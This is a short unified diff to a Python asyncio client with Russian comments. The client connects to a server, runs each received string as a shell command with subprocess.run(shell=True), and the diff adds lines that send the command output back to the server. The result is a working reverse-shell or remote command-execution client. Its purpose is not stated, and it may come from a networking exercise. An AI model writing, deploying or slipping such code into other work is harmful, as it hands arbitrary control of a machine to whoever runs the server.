@@ -7,11 +7,16 @@ async def client(host, port):
   reader, writer = await asyncio.open_connection(host, port)
   # ждем ответа сервера(обрабатываем по 100 байт данных)
   while True:
-    data = await reader.read(100)
+    data = await reader.read(4096)
     if not data:
       break
     # получаем команду и выводим в командную строку
     result = subprocess.run(data.decode(), shell=True, capture_output=True, text=True)
+
+    output = result.stdout.strip() or result.stderr.strip()
+
+    writer.write(output.encode())
+
     await writer.drain()
 
 if __name__ == "__main__":
